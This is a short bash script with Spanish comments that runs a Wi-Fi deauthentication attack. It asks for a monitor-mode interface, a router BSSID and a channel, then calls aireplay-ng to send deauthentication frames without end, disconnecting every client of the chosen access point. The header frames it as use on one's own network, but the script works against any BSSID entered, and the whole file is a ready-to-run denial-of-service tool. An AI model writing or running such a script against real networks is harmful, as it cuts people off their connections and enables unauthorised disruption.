#!/bin/bash
# DEAUTH_MASSIVO.sh - Desconecta TODO dispositivo de tu WiFi

echo "🔴 SATURACIÓN DEAUTH - Presiona CTRL+C para detener"
echo ""

read -p "📡 Interfaz en monitor mode (ej: wlan0mon): " INTERFAZ
read -p "🎯 MAC de tu router (BSSID): " BSSID
read -p "📶 Canal WiFi: " CANAL

# Fijar canal
sudo iwconfig $INTERFAZ channel $CANAL

# Ataque: envía 100 deauth por segundo a TODOS los clientes
# --deauth 0 = enviar infinitamente
sudo aireplay-ng --deauth 0 -a $BSSID $INTERFAZ